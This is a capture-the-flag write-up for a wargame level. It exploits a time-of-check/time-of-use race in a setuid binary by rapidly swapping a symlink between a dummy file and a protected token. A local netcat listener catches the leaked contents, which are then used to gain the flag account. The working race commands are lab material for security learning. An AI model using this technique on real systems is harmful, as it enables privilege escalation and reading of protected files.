# Level 10

## Initial Context

- Two file: `level10` and `token`

## Solving the Challenge

### Analyzing

```bash
$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

`level10` seems to send a file to a socket only if you have the permission:

```bash
$ ./level10
./level10 file host
        sends file to host if you have access to it

$ ./level10 token 127.0.0.1
You don t have access to token

$ ./level10 /etc/passwd 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1

# starting a netcat in the background
$ nc -lkvn 0.0.0.0 6969 &
[1] 27240

$ ./level10 /etc/passwd 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connection from 127.0.0.1 port 6969 [tcp/*] accepted
.*( )*.
Connected!
Sending file ..
...
wrote file!
```

But how to read the `token` file? The program seems to before check for the file permission, then try to open it.

```bash
$ ltrace ./level10 token 127.0.0.1
access("token", 4) = -1
printf("You don't have access to %s\n", "token") = 31
```

```bash
$ ltrace ./level10 /etc/passwd 127.0.0.1
access("/etc/passwd", 4) = 0
...
open("/etc/passwd", 0, 010) = 4
...
```

That means that if we manage to 'change' the file that is trying to be open just after the `access` check but just before the `open` call, it should works.

### Exploiting

By quickly changing the file, we should manage to randomly get the timing right. The `access` would check the dummy file, and the `open` would open the `token` file.

```bash
# create a dummy file
$ echo 'dummy' > /tmp/dummy

$ while true; do
  # link `/tmp/level10` to the dummy file
  ln -s /tmp/dummy /tmp/level10;
  # remove the link
  rm /tmp/level10;
  # link `/tmp/level10` to the token file
  ln -s ~/token /tmp/level10;
  # remove the link
  rm /tmp/level10;
done
```

In another terminal, start a netcat with filters to remove useless content:

```bash
nc -lkvn 0.0.0.0 6969 2>&1 | grep -v 'Connection from' | grep -v 'dummy' | grep -v '( )'
```

In again another terminal, start the `level10` executable in a loop:

```bash
while true; do
  ./level10 /tmp/level10 127.0.0.1;
done
```

After waiting a bit, the flag will appear on the netcat's terminal.

Now we can log into `flag10` and do `getflag`.

```
$ su flag10
$ getflag
Check flag.Here is your token : ....
```
